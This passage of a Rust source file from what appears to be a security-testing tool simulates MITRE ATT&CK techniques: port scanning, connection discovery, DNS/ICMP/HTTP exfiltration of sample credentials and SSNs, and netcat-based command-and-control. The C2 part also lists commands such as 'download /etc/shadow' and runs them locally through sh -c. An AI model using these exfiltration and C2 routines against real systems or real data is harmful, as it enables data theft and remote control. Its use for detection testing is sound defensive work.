// SIGNALBENCH - Network Techniques
// Network-based attack simulation techniques
// 
// This module contains network-based attacks according to MITRE ATT&CK framework
// Developed by Simon Sigre (simon@gocortex.io)
// Part of the GoCortex.io platform for security testing and validation

use crate::config::TechniqueConfig;
use crate::techniques::{AttackTechnique, CleanupFuture, ExecuteFuture, SimulationResult, Technique, TechniqueParameter};
use async_trait::async_trait;

use std::fs::File;
use std::io::Write;
use std::path::Path;
use tokio::process::Command;
use tokio::time::{sleep, Duration};
use log::{debug, error, info};
use base64::{Engine as _, engine::general_purpose::STANDARD as BASE64};

// ======================================
// T1046 - Network Service Discovery
// ======================================
pub struct NetworkServiceDiscovery {}

#[async_trait]
impl AttackTechnique for NetworkServiceDiscovery {
    fn info(&self) -> Technique {
        Technique {
            id: "T1046".to_string(),
            name: "Network Service Discovery".to_string(),
            description: "Generates telemetry for network service discovery and port scanning".to_string(),
            category: "DISCOVERY".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "target_hosts".to_string(),
                    description: "Target hosts to scan (comma-separated IPs or CIDR)".to_string(),
                    required: true,
                    default: Some("127.0.0.1".to_string()),
                },
                TechniqueParameter {
                    name: "ports".to_string(),
                    description: "Ports to scan (e.g., 22,80,443 or 1-1000)".to_string(),
                    required: true,
                    default: Some("22,80,443,3306,5432,8080".to_string()),
                },
                TechniqueParameter {
                    name: "output_file".to_string(),
                    description: "Path to save scan results".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_port_scan_results.txt".to_string()),
                },
            ],
            detection: "Network monitoring tools can detect port scanning activity".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let target_hosts = config
                .parameters
                .get("target_hosts")
                .unwrap_or(&"127.0.0.1".to_string())
                .clone();
            let ports = config
                .parameters
                .get("ports")
                .unwrap_or(&"22,80,443,3306,5432,8080".to_string())
                .clone();
            let output_file = config
                .parameters
                .get("output_file")
                .unwrap_or(&"/tmp/signalbench_port_scan_results.txt".to_string())
                .clone();
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would perform port scanning on {target_hosts} for ports {ports} and save results to {output_file}"),
                    artifacts: vec![output_file],
                    cleanup_required: true,
                });
            }
            
            // Create output file
            let mut file = File::create(&output_file)
                .map_err(|e| format!("Failed to create output file: {e}"))?;
                
            // Write header
            writeln!(file, "# SignalBench Network Service Discovery").unwrap();
            writeln!(file, "# MITRE ATT&CK Technique: T1046").unwrap();
            writeln!(file, "# Target hosts: {target_hosts}").unwrap();
            writeln!(file, "# Ports: {ports}").unwrap();
            writeln!(file, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(file, "# This is a controlled scan - limited to localhost only").unwrap();
            writeln!(file, "# --------------------------------------------------------").unwrap();
            
            // Parse target hosts (could be multiple comma-separated values)
            let hosts: Vec<&str> = target_hosts.split(',').collect();
            
            // Parse ports (could be ranges like "1-1000" or single ports like "80,443")
            let mut port_list = Vec::new();
            for port_spec in ports.split(',') {
                if port_spec.contains('-') {
                    // It's a range
                    let range: Vec<&str> = port_spec.split('-').collect();
                    if range.len() == 2 {
                        if let (Ok(start), Ok(end)) = (range[0].parse::<u16>(), range[1].parse::<u16>()) {
                            // Only add a reasonable number of ports to avoid generating huge files
                            let end_value: u16 = std::cmp::min(end, start + 100); // Limit to 100 ports per range
                            for port in start..=end_value {
                                port_list.push(port);
                            }
                        }
                    }
                } else {
                    // It's a single port
                    if let Ok(port) = port_spec.parse::<u16>() {
                        port_list.push(port);
                    }
                }
            }
            
            // Generate realistic test results
            for host in hosts {
                writeln!(file, "\nScan results for host: {host}").unwrap();
                
                // Run a real check for localhost only (safe)
                if host == "127.0.0.1" || host == "localhost" {
                    for port in &port_list {
                        // Use netcat to check if port is open on localhost
                        let status = Command::new("nc")
                            .arg("-z")
                            .arg("-v")
                            .arg("-w")
                            .arg("1") // 1 second timeout
                            .arg(host)
                            .arg(port.to_string())
                            .output()
                            .await;
                            
                        match status {
                            Ok(output) => {
                                let exit_code = output.status.code().unwrap_or(1);
                                let is_open = exit_code == 0;
                                let state = if is_open { "OPEN" } else { "CLOSED" };
                                
                                writeln!(file, "Port {:5} - {:<10} - {}", port, state, 
                                         if is_open { "Service might be running" } else { "No service detected" })
                                    .unwrap();
                            },
                            Err(e) => {
                                writeln!(file, "Port {port:5} - ERROR    - Failed to check: {e}").unwrap();
                            }
                        }
                        
                        // Small delay to avoid overwhelming the system
                        sleep(Duration::from_millis(50)).await;
                    }
                } else {
                    // For non-localhost targets, only generate test results
                    // Select some random ports to show as "open" for simulation
                    // Initialize random number generator for real randomization (not needed in this simulation)
                    for port in &port_list {
                        // Randomly determine if port is "open" (for simulation)
                        let is_open = match *port {
                            22 => true,   // SSH usually open
                            80 => true,   // HTTP usually open
                            443 => true,  // HTTPS usually open
                            _ => rand::random::<bool>() && rand::random::<bool>(), // 25% chance for other ports
                        };
                        
                        let state = if is_open { "OPEN" } else { "CLOSED" };
                        let service = match *port {
                            22 => "SSH",
                            80 => "HTTP",
                            443 => "HTTPS",
                            3306 => "MySQL",
                            5432 => "PostgreSQL",
                            8080 => "HTTP-ALT",
                            _ => "Unknown",
                        };
                        
                        writeln!(file, "Port {:5} - {:<10} - {}", port, state, 
                                 if is_open { format!("{service} might be running") } else { "No service detected".to_string() })
                            .unwrap();
                    }
                }
            }
            
            // Close the file
            drop(file);
            
            info!("Network service discovery simulation complete, results saved to {output_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Network service discovery simulation completed. Results saved to {output_file}"),
                artifacts: vec![output_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}

// ======================================
// T1049 - System Network Connections Discovery
// ======================================
pub struct SystemNetworkConnectionsDiscovery {}

#[async_trait]
impl AttackTechnique for SystemNetworkConnectionsDiscovery {
    fn info(&self) -> Technique {
        Technique {
            id: "T1049".to_string(),
            name: "System Network Connections Discovery".to_string(),
            description: "Generates telemetry for network connection discovery activities".to_string(),
            category: "DISCOVERY".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "output_file".to_string(),
                    description: "Path to save connection discovery results".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_network_connections.txt".to_string()),
                },
                TechniqueParameter {
                    name: "commands".to_string(),
                    description: "Comma-separated list of commands to run for connection discovery".to_string(),
                    required: false,
                    default: Some("netstat -tuln,netstat -antup,ss -tunap,lsof -i -n -P".to_string()),
                },
            ],
            detection: "Process monitoring can detect network connection discovery commands".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let output_file = config
                .parameters
                .get("output_file")
                .unwrap_or(&"/tmp/signalbench_network_connections.txt".to_string())
                .clone();
            let commands = config
                .parameters
                .get("commands")
                .unwrap_or(&"netstat -tuln,netstat -antup,ss -tunap,lsof -i -n -P".to_string())
                .clone();
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would perform network connection discovery using commands: {commands} and save results to {output_file}"),
                    artifacts: vec![output_file],
                    cleanup_required: true,
                });
            }
            
            // Create output file
            let mut file = File::create(&output_file)
                .map_err(|e| format!("Failed to create output file: {e}"))?;
                
            // Write header
            writeln!(file, "# SignalBench System Network Connections Discovery").unwrap();
            writeln!(file, "# MITRE ATT&CK Technique: T1049").unwrap();
            writeln!(file, "# Commands: {commands}").unwrap();
            writeln!(file, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(file, "# --------------------------------------------------------").unwrap();
            
            // Run each command and capture output
            for cmd in commands.split(',') {
                let cmd_parts: Vec<&str> = cmd.split_whitespace().collect();
                
                if cmd_parts.is_empty() {
                    continue;
                }
                
                writeln!(file, "\n## Command: {cmd}").unwrap();
                writeln!(file, "## Executed at: {}", chrono::Local::now()).unwrap();
                
                let mut command = Command::new(cmd_parts[0]);
                for arg in &cmd_parts[1..] {
                    command.arg(arg);
                }
                
                match command.output().await {
                    Ok(output) => {
                        let stdout = String::from_utf8_lossy(&output.stdout);
                        let stderr = String::from_utf8_lossy(&output.stderr);
                        
                        if !stdout.is_empty() {
                            writeln!(file, "## STDOUT:").unwrap();
                            writeln!(file, "{stdout}").unwrap();
                        }
                        
                        if !stderr.is_empty() {
                            writeln!(file, "## STDERR:").unwrap();
                            writeln!(file, "{stderr}").unwrap();
                        }
                        
                        let status = output.status.code().unwrap_or(-1);
                        writeln!(file, "## Exit status: {status}").unwrap();
                    },
                    Err(e) => {
                        writeln!(file, "## ERROR: Failed to execute command: {e}").unwrap();
                    }
                }
                
                writeln!(file, "## --------------------------------------------------------").unwrap();
                
                // Small delay between commands
                sleep(Duration::from_millis(100)).await;
            }
            
            // Close the file
            drop(file);
            
            info!("Network connections discovery simulation complete, results saved to {output_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Network connections discovery simulation completed. Results saved to {output_file}"),
                artifacts: vec![output_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}

// ======================================
// T1048 - Exfiltration Over Alternative Protocol
// ======================================
pub struct ExfiltrationOverAlternativeProtocol {}

#[async_trait]
impl AttackTechnique for ExfiltrationOverAlternativeProtocol {
    fn info(&self) -> Technique {
        Technique {
            id: "T1048".to_string(),
            name: "Exfiltration Over Alternative Protocol".to_string(),
            description: "Generates telemetry for data exfiltration using alternative protocols like DNS or ICMP".to_string(),
            category: "EXFILTRATION".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "protocol".to_string(),
                    description: "Protocol to use for exfiltration (dns, icmp, http)".to_string(),
                    required: true,
                    default: Some("dns".to_string()),
                },
                TechniqueParameter {
                    name: "data_file".to_string(),
                    description: "Path to save test data to be exfiltrated".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_exfil_data.txt".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save exfiltration log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_exfil_log.txt".to_string()),
                },
                TechniqueParameter {
                    name: "target".to_string(),
                    description: "Target for exfiltration (domain for DNS, IP for ICMP, URL for HTTP)".to_string(),
                    required: false,
                    default: Some("example.com".to_string()),
                },
            ],
            detection: "Network monitoring can detect unusual DNS queries, ICMP traffic, or HTTP requests".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let protocol = config
                .parameters
                .get("protocol")
                .unwrap_or(&"dns".to_string())
                .clone();
            let data_file = config
                .parameters
                .get("data_file")
                .unwrap_or(&"/tmp/signalbench_exfil_data.txt".to_string())
                .clone();
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_exfil_log.txt".to_string())
                .clone();
            let target = config
                .parameters
                .get("target")
                .unwrap_or(&"example.com".to_string())
                .clone();
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would perform data exfiltration using {protocol} protocol to {target} and save logs to {log_file}"),
                    artifacts: vec![data_file.clone(), log_file.clone()],
                    cleanup_required: true,
                });
            }
            
            // Create sample data file
            let mut file = File::create(&data_file)
                .map_err(|e| format!("Failed to create data file: {e}"))?;
            
            // Create test sensitive data for exfiltration telemetry
            writeln!(file, "CONFIDENTIAL - Internal Use Only").unwrap();
            writeln!(file, "User database credentials:").unwrap();
            writeln!(file, "  Database: production_db").unwrap();
            writeln!(file, "  Username: db_admin").unwrap();
            writeln!(file, "  Password: TestPassword1234!").unwrap();
            writeln!(file, "API Keys:").unwrap();
            writeln!(file, "  AWS: AKIA0123456789SAMPLE").unwrap();
            writeln!(file, "  Google: AIzaSyDSIMULATED_KEY_123456789").unwrap();
            writeln!(file, "Employee records:").unwrap();
            for i in 1..6 {
                writeln!(file, "  Employee #{i}: John Doe {i}, SSN: 123-45-678{i}, DOB: 01/0{i}/1980").unwrap();
            }
            
            // Close data file
            drop(file);
            
            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            // Write header
            writeln!(log_file_handle, "# SignalBench Exfiltration Over Alternative Protocol").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK Technique: T1048").unwrap();
            writeln!(log_file_handle, "# Protocol: {protocol}").unwrap();
            writeln!(log_file_handle, "# Target: {target}").unwrap();
            writeln!(log_file_handle, "# Data file: {data_file}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
            
            // Simulate exfiltration process based on the selected protocol
            match protocol.to_lowercase().as_str() {
                "dns" => {
                    writeln!(log_file_handle, "\n## DNS Exfiltration - Actual Network Traffic").unwrap();
                    
                    // Read the data file
                    let data = std::fs::read_to_string(&data_file)
                        .map_err(|e| format!("Failed to read data file: {e}"))?;
                    
                    // Split data into chunks (DNS has length limitations)
                    let chunks: Vec<&str> = data.split_whitespace().collect();
                    
                    writeln!(log_file_handle, "Encoding data into Base64 before exfiltration...").unwrap();
                    let mut successful_exfils = 0;
                    
                    for (i, chunk) in chunks.iter().enumerate() {
                        // Base64 encode the data
                        let encoded = BASE64.encode(chunk);
                        // Truncate encoded data to reasonable size for DNS
                        let encoded = &encoded[0..std::cmp::min(encoded.len(), 30)];
                        
                        // Create the DNS query
                        let subdomain = encoded.to_lowercase().to_string();
                        let query = format!("{subdomain}.{target}");
                        
                        writeln!(log_file_handle, "[{}] Exfiltrating chunk: {} -> DNS query: {}", 
                            i + 1, chunk, query).unwrap();
                        
                        // Actually perform the DNS lookup using dig command
                        let output = Command::new("dig")
                            .arg(&query)
                            .arg("+short")
                            .output()
                            .await;
                            
                        match output {
                            Ok(result) => {
                                let status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Status: {status}").unwrap();
                                if !stdout.is_empty() {
                                    writeln!(log_file_handle, "    Response: {stdout}").unwrap();
                                }
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                                
                                successful_exfils += 1;
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    Failed to execute DNS query: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between requests to avoid flooding
                        sleep(Duration::from_millis(100)).await;
                    }
                    
                    writeln!(log_file_handle, "\nExfiltration complete - {}/{} chunks of data sent via actual DNS queries", 
                        successful_exfils, chunks.len()).unwrap();
                },
                "icmp" => {
                    writeln!(log_file_handle, "\n## ICMP Exfiltration - Actual Network Traffic").unwrap();
                    
                    // Read the data file
                    let data = std::fs::read_to_string(&data_file)
                        .map_err(|e| format!("Failed to read data file: {e}"))?;
                    
                    // Split data into chunks
                    let chunks: Vec<&str> = data.lines().collect();
                    
                    writeln!(log_file_handle, "Preparing data for ICMP exfiltration...").unwrap();
                    let mut successful_exfils = 0;
                    
                    for (i, chunk) in chunks.iter().enumerate() {
                        // Encode data in hex for ICMP payload
                        let hex_data = hex::encode(chunk.as_bytes());
                        let hex_pattern = if hex_data.len() >= 16 { 
                            hex_data[0..16].to_string() 
                        } else { 
                            hex_data.clone() 
                        };
                        
                        writeln!(log_file_handle, "[{}] Exfiltrating: {}", i + 1, chunk).unwrap();
                        
                        // Actually execute ping with payload - this will send real ICMP packets
                        let output = Command::new("ping")
                            .arg("-c")
                            .arg("1")
                            .arg("-p")
                            .arg(&hex_pattern)
                            .arg(&target)
                            .output()
                            .await;
                            
                        match output {
                            Ok(result) => {
                                let status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Status: {status}").unwrap();
                                if status == 0 {
                                    successful_exfils += 1;
                                }
                                
                                if !stdout.is_empty() {
                                    let summary = if stdout.len() > 200 {
                                        format!("{}... (truncated)", &stdout[0..200])
                                    } else {
                                        stdout.to_string()
                                    };
                                    writeln!(log_file_handle, "    Response: {summary}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    Failed to execute ICMP packet: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between packets to avoid flooding
                        sleep(Duration::from_millis(200)).await;
                    }
                    
                    writeln!(log_file_handle, "\nExfiltration complete - {}/{} chunks of data sent via actual ICMP packets", 
                        successful_exfils, chunks.len()).unwrap();
                },
                "http" => {
                    writeln!(log_file_handle, "\n## HTTP Exfiltration - Actual Network Traffic").unwrap();
                    
                    // Read the data file
                    let data = std::fs::read_to_string(&data_file)
                        .map_err(|e| format!("Failed to read data file: {e}"))?;
                    
                    // Split data into chunks
                    let chunks: Vec<&str> = data.lines().collect();
                    
                    writeln!(log_file_handle, "Preparing data for HTTP exfiltration...").unwrap();
                    let mut successful_exfils = 0;
                    
                    for (i, chunk) in chunks.iter().enumerate() {
                        // Encode data for HTTP request
                        let encoded = BASE64.encode(chunk);
                        
                        writeln!(log_file_handle, "[{}] Exfiltrating: {}", i + 1, chunk).unwrap();
                        
                        // Using curl to actually send HTTP request with encoded data
                        // Use a target URL (defaults to example.com if not specified)
                        let url = format!("{target}/exfil?data={encoded}");
                        let output = Command::new("curl")
                            .arg("-s")
                            .arg("-m")  // timeout in seconds
                            .arg("5")
                            .arg(&url)
                            .output()
                            .await;
                            
                        match output {
                            Ok(result) => {
                                let status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Status: {status}").unwrap();
                                if status == 0 {
                                    successful_exfils += 1;
                                }
                                
                                if !stdout.is_empty() {
                                    let summary = if stdout.len() > 200 {
                                        format!("{}... (truncated)", &stdout[0..200])
                                    } else {
                                        stdout.to_string()
                                    };
                                    writeln!(log_file_handle, "    Response: {summary}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    Failed to execute HTTP request: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between requests to avoid flooding
                        sleep(Duration::from_millis(150)).await;
                    }
                    
                    writeln!(log_file_handle, "\nExfiltration complete - {}/{} chunks of data sent via actual HTTP requests", 
                        successful_exfils, chunks.len()).unwrap();
                },
                _ => {
                    writeln!(log_file_handle, "\n## ERROR: Unsupported protocol '{protocol}'").unwrap();
                    writeln!(log_file_handle, "Supported protocols: dns, icmp, http").unwrap();
                }
            }
            
            // Close log file
            drop(log_file_handle);
            
            info!("Exfiltration simulation complete, logs saved to {log_file}");
            
            Ok(SimulationResult {
                technique_id: technique_info.id,
                success: true,
                message: format!("Exfiltration over {protocol} simulation completed. Data file: {data_file}, Logs: {log_file}"),
                artifacts: vec![data_file.to_string(), log_file.to_string()],
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = std::fs::remove_file(artifact) {
                        error!("Failed to remove artifact {artifact}: {e}");
                    } else {
                        debug!("Removed artifact: {artifact}");
                    }
                }
            }
            Ok(())
        })
    }
}

// ======================================
// T1095 - Non-Application Layer Protocol
// ======================================
pub struct NonApplicationLayerProtocol {}

#[async_trait]
impl AttackTechnique for NonApplicationLayerProtocol {
    fn info(&self) -> Technique {
        Technique {
            id: "T1095".to_string(),
            name: "Non-Application Layer Protocol".to_string(),
            description: "Generates telemetry for non-application layer protocol C2 communications".to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "protocol".to_string(),
                    description: "Protocol to use for telemetry generation (icmp, tcp, udp)".to_string(),
                    required: true,
                    default: Some("tcp".to_string()),
                },
                TechniqueParameter {
                    name: "target".to_string(),
                    description: "Target IP address".to_string(),
                    required: true,
                    default: Some("127.0.0.1".to_string()),
                },
                TechniqueParameter {
                    name: "port".to_string(),
                    description: "Target port (for TCP/UDP)".to_string(),
                    required: false,
                    default: Some("4444".to_string()),
                },
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save C2 simulation log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_c2_simulation.txt".to_string()),
                },
                TechniqueParameter {
                    name: "command_file".to_string(),
                    description: "Path to save test C2 commands".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_c2_commands.txt".to_string()),
                },
            ],
            detection: "Network monitoring can detect unusual protocol usage and non-standard communications".to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
        }
    }

    fn execute<'a>(
        &'a self,
        config: &'a TechniqueConfig,
        dry_run: bool,
    ) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let technique_info = self.info();
            
            // Get parameters from config or use defaults
            let protocol = config
                .parameters
                .get("protocol")
                .unwrap_or(&"tcp".to_string())
                .clone();
            let target = config
                .parameters
                .get("target")
                .unwrap_or(&"127.0.0.1".to_string())
                .clone();
            let port = config
                .parameters
                .get("port")
                .unwrap_or(&"4444".to_string())
                .clone();
            let log_file = config
                .parameters
                .get("log_file")
                .unwrap_or(&"/tmp/signalbench_c2_simulation.txt".to_string())
                .clone();
            let command_file = config
                .parameters
                .get("command_file")
                .unwrap_or(&"/tmp/signalbench_c2_commands.txt".to_string())
                .clone();
            
            if dry_run {
                return Ok(SimulationResult {
                    technique_id: technique_info.id,
                    success: true,
                    message: format!("Would perform C2 communications using {protocol} protocol to {target}:{port} and save logs to {log_file}"),
                    artifacts: vec![log_file.clone(), command_file.clone()],
                    cleanup_required: true,
                });
            }
            
            // Create command file with test C2 commands
            let mut cmd_file = File::create(&command_file)
                .map_err(|e| format!("Failed to create command file: {e}"))?;
                
            // Write simulated C2 commands
            writeln!(cmd_file, "# Test C2 Commands").unwrap();
            writeln!(cmd_file, "whoami").unwrap();
            writeln!(cmd_file, "hostname").unwrap();
            writeln!(cmd_file, "ip addr").unwrap();
            writeln!(cmd_file, "cat /etc/passwd").unwrap();
            writeln!(cmd_file, "ps aux").unwrap();
            writeln!(cmd_file, "ls -la /root").unwrap();
            writeln!(cmd_file, "find / -perm -4000 -type f").unwrap();
            writeln!(cmd_file, "download /etc/shadow").unwrap();
            writeln!(cmd_file, "keylog start").unwrap();
            writeln!(cmd_file, "screenshot").unwrap();
            
            // Close command file
            drop(cmd_file);
            
            // Create log file
            let mut log_file_handle = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {e}"))?;
                
            // Write header
            writeln!(log_file_handle, "# SignalBench Non-Application Layer Protocol C2").unwrap();
            writeln!(log_file_handle, "# MITRE ATT&CK Technique: T1095").unwrap();
            writeln!(log_file_handle, "# Protocol: {protocol}").unwrap();
            writeln!(log_file_handle, "# Target: {target}:{port}").unwrap();
            writeln!(log_file_handle, "# Command file: {command_file}").unwrap();
            writeln!(log_file_handle, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log_file_handle, "# --------------------------------------------------------").unwrap();
            
            // Read commands from file
            let commands = std::fs::read_to_string(&command_file)
                .map_err(|e| format!("Failed to read command file: {e}"))?;
                
            let command_lines: Vec<&str> = commands.lines()
                .filter(|line| !line.starts_with('#') && !line.is_empty())
                .collect();
            
            // Simulate C2 communication based on protocol
            match protocol.to_lowercase().as_str() {
                "tcp" => {
                    writeln!(log_file_handle, "\n## TCP-based C2 - Actual Network Traffic").unwrap();
                    writeln!(log_file_handle, "Establishing TCP connection to {target}:{port}...").unwrap();
                    
                    // First check if port is actually open
                    let port_check = Command::new("nc")
                        .arg("-z")
                        .arg("-v")
                        .arg("-w")
                        .arg("1") // 1 second timeout
                        .arg(&target)
                        .arg(&port)
                        .output()
                        .await;
                        
                    let is_port_open = match port_check {
                        Ok(output) => output.status.code().unwrap_or(1) == 0,
                        Err(_) => false
                    };
                    
                    if is_port_open {
                        writeln!(log_file_handle, "Target port is open and accessible.").unwrap();
                    } else {
                        writeln!(log_file_handle, "Target port is closed or not accessible. Will attempt to send data anyway.").unwrap();
                    }
                    
                    let mut successful_commands = 0;
                    
                    // Use netcat to actually send data over TCP
                    writeln!(log_file_handle, "\nExecuting actual command transmission over TCP:").unwrap();
                    
                    for (i, cmd) in command_lines.iter().enumerate() {
                        // Encode command in base64 for transmission
                        let encoded_cmd = BASE64.encode(cmd);
                        
                        writeln!(log_file_handle, "[{}] Sending command: {}", i + 1, cmd).unwrap();
                        writeln!(log_file_handle, "    TX: {} bytes - {}", cmd.len(), encoded_cmd).unwrap();
                        
                        // Create a temporary file with the encoded command
                        let temp_file = format!("/tmp/signalbench_c2_tcp_cmd_{i}.tmp");
                        if let Err(e) = std::fs::write(&temp_file, &encoded_cmd) {
                            writeln!(log_file_handle, "    Failed to create temporary file: {e}").unwrap();
                            continue;
                        }
                        
                        // Use netcat to send the command to the target
                        let output = Command::new("timeout")
                            .arg("3")  // Timeout after 3 seconds
                            .arg("nc")
                            .arg(&target)
                            .arg(&port)
                            .arg("-w")
                            .arg("2")  // Wait 2 seconds for response
                            .arg("<")
                            .arg(&temp_file)
                            .output()
                            .await;
                            
                        // Clean up temp file
                        let _ = std::fs::remove_file(&temp_file);
                        
                        match output {
                            Ok(result) => {
                                let exit_status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Command Status: {exit_status}").unwrap();
                                
                                if !stdout.is_empty() {
                                    writeln!(log_file_handle, "    Response: {stdout}").unwrap();
                                }
                                
                                if !stderr.is_empty() {
                                    writeln!(log_file_handle, "    Error: {stderr}").unwrap();
                                }
                                
                                // Also execute the command locally to get a realistic response
                                let local_output = Command::new("sh")
                                    .arg("-c")
                                    .arg(cmd)
                                    .output()
                                    .await;
                                    
                                match local_output {
                                    Ok(local_result) => {
                                        let local_stdout = String::from_utf8_lossy(&local_result.stdout);
                                        if !local_stdout.is_empty() {
                                            let preview = if local_stdout.len() > 200 {
                                                format!("{}... (truncated)", &local_stdout[0..200])
                                            } else {
                                                local_stdout.to_string()
                                            };
                                            writeln!(log_file_handle, "    Local execution result: {preview}").unwrap();
                                        }
                                    },
                                    Err(e) => {
                                        writeln!(log_file_handle, "    Local execution failed: {e}").unwrap();
                                    }
                                }
                                
                                successful_commands += 1;
                            },
                            Err(e) => {
                                writeln!(log_file_handle, "    TCP transmission failed: {e}").unwrap();
                            }
                        }
                        
                        // Add delay between commands
                        sleep(Duration::from_millis(300)).await;
                    }
                    
                    writeln!(log_file_handle, "\nC2 communication complete - {}/{} commands transmitted via actual TCP", 
                        successful_commands, command_lines.len()).unwrap();
                },
                "udp" => {
                    writeln!(log_file_handle, "\n## UDP-based C2 - Actual Network Traffic").unwrap();
                    
                    writeln!(log_file_handle, "Preparing UDP packets for C2 communication with {target}:{port}...").unwrap();
                    let mut successful_commands = 0;

                    for (i, cmd) in command_lines.iter().enumerate() {
                        // Encode command in base64 for transmission
                        let encoded_cmd = BASE64.encode(cmd);
                        
                        writeln!(log_file_handle, "[{}] Sending command via UDP: {}", i + 1, cmd).unwrap();
                        writeln!(log_file_handle, "    TX UDP Packet: {} bytes - {}", cmd.len(), encoded_cmd).unwrap();
                        
                        // Create a temporary file with the encoded command
                        let temp_file = format!("/tmp/signalbench_c2_udp_cmd_{i}.tmp");
                        if let Err(e) = std::fs::write(&temp_file, &encoded_cmd) {
                            writeln!(log_file_handle, "    Failed to create temporary file: {e}").unwrap();
                            continue;
                        }
                        
                        // Use netcat to actually send UDP packet
                        let output = Command::new("sh")
                            .arg("-c")
                            .arg(format!("cat {temp_file} | nc -u -w 1 {target} {port}"))
                            .output()
                            .await;
                            
                        // Clean up temp file
                        let _ = std::fs::remove_file(&temp_file);
                        
                        match output {
                            Ok(result) => {
                                let exit_status = result.status.code().unwrap_or(-1);
                                let stdout = String::from_utf8_lossy(&result.stdout);
                                let stderr = String::from_utf8_lossy(&result.stderr);
                                
                                writeln!(log_file_handle, "    Command Status: {exit_status}").unwrap();
                                
                                if !stdout.is_empty() {
